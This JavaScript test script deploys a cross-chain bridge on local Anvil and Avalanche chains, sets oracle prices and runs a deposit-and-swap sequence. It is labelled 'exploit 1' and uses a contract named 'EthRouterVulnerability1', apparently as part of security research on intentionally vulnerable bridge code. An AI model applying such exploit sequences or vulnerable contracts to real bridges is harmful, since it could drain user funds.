require('module-alias/register');
const fs = require('fs');
const path = require('path');
const assert = require('assert');
const chalk = require('chalk');
const { 
    extractSolcVersion, 
    compileWithVersion, 
    deployContract 
} = require('@lib/web3/deploy');
const setupAvalancheEnv = require('@envs/avalanche-subnet');
const setupAnvilEnv = require('@envs/anvil');
const deployBridge = require('@envs/bridge-decentralized');
const { sleep } = require('@lib/os/process');

const getLogger = require('@lib/logging/logger').getLogger;
const bridgeTestLogger = getLogger('bridgetest');

async function sequence(contractsA, contractsB, web3A, web3B){

    let tokenA = contractsA.token;
    let vaultA = contractsA.vault;
    let routerA = contractsA.router;
    let oracleA = contractsA.oracle;

    let tokenB = contractsB.token;
    let vaultB = contractsB.vault;
    let routerB = contractsB.router;
    let oracleB = contractsB.oracle;


    let accountA = web3A.eth.accounts.wallet[0].address;
    let accountB = web3B.eth.accounts.wallet[0].address;
    console.log(vaultA._address);

    //Add exchange rates
    let addTrustedOnOracleA = await oracleA.methods.addTrustedSource(accountA).send({
        from: accountA,
        gas: 300000
    });
    let addAvaxValueOnA = await oracleA.methods.submitPrice("B.AVAX", 400).send({
        from: accountA,
        gas: 300000
    });
    let addERC20ValueOnAA = await oracleA.methods.submitPrice("A." + tokenA._address, 2000).send({
        from: accountA,
        gas: 300000
    });
    let addERC20ValueOnAB = await oracleA.methods.submitPrice("B." + tokenB._address, 2000).send({
        from: accountA,
        gas: 300000
    });


    let addTrustedOnOracleB = await oracleB.methods.addTrustedSource(accountB).send({
        from: accountB,
        gas: 300000
    });
    let addAvaxValueOnB = await oracleB.methods.submitPrice("A.ETH", 2500).send({
        from: accountB,
        gas: 300000
    });
    let addERC20ValueOnBA = await oracleB.methods.submitPrice("A." + tokenA._address, 5000).send({
        from: accountB,
        gas: 300000
    });
    let addERC20ValueOnBB = await oracleB.methods.submitPrice("B." + tokenB._address, 5000).send({
        from: accountB,
        gas: 300000
    });

    let fundTarget = await vaultB.methods.fund().send({
        from: accountB,
        gas: 300000,
        value: 100000
    });
    if(!fundTarget.status){
        console.log(fundTarget);
    }

    let balance = await web3B.eth.getBalance(vaultB._address); 
    console.log(balance);

    let receipt1 = await routerA.methods.eth_deposit(vaultA._address, "0x0000000000000000000000000000000000000000", 100, "SWAP:B.AVAX:" + accountB).send({
        from: accountA,
        gas: 300000,
        value: 100
    });

    await sleep(5000);

    let balance2 = await web3B.eth.getBalance(vaultB._address); 
    console.log(balance2);
    assert(balance2 == 99500, "Value was not 99500 as expected: " + balance2);
    return balance2 == 99500;
}

async function callSmartContract(method, sender, value = 0){
    let receipt = await method.send({
        from: sender,
        gas: 300000,
        value: value
    });
}

async function startUp() {
    console.log(chalk.cyan(`exploit 1`));
    bridgeTestLogger.debug("Starting Anvil...");
    //let envAnvil = await setupAnvilEnv();

    const maxRetries = 10;
    let attempts = 0;
    let envAnvil;

    while (attempts < maxRetries) {
        try {
            await sleep(1000);
            envAnvil = await setupAnvilEnv();
            bridgeTestLogger.debug('Environment setup successful:', envAnvil);
            break;
        } catch (error) {
            bridgeTestLogger.debug(`Attempt ${attempts + 1}: Failed to set up environment - ${error}`);
            console.error(`Attempt ${attempts + 1}: Failed to set up environment - ${error}`);
            attempts++;
            if (attempts === maxRetries) {
                console.error('Max retries reached, failing with error');
                bridgeTestLogger.error('Max retries reached, failing with error');
                throw error; // Optionally re-throw the last error after max retries
            }
        }
    }

    //bridgeTestLogger.debug("Finished running Anvil...");

    bridgeTestLogger.debug("Starting Avalanche...");
    let envAvalanche = await setupAvalancheEnv(); 
    bridgeTestLogger.debug("Finished running Avalanche");

    bridgeTestLogger.debug("Web3 A: " + envAnvil.envInfo.rpcAddress);
    bridgeTestLogger.debug("Web3 B: " + envAvalanche.envInfo.rpcAddress);

    let contractsA = await deployBridge(envAnvil.web3, envAnvil.envInfo, 'A', 'ETH', 'EthRouterVulnerability1', 'EthVaultOracle', 'Oracle', 'eth_bridgeForwards', 'eth_bridgeForwardsERC20');
    let contractsB = await deployBridge(envAvalanche.web3, envAvalanche.envInfo, 'B', 'AVAX', 'AvaxRouter', 'AvaxVaultOracle', 'Oracle', 'avax_bridgeForwards', 'avax_bridgeForwardsERC20');

    let contractSourceA = fs.readFileSync(path.join('contracts', 'src', 'cross-chain', 'EthRouter.sol'), 'utf8');

    let contractSourceB = fs.readFileSync(path.join('contracts', 'src', 'cross-chain', 'AvaxRouter.sol'), 'utf8');

    bridgeTestLogger.debug("Executing sequence");
    let execution = await sequence(contractsA, contractsB, envAnvil.web3, envAvalanche.web3);
    bridgeTestLogger.debug("Done");

}

//startUp();

module.exports = startUp;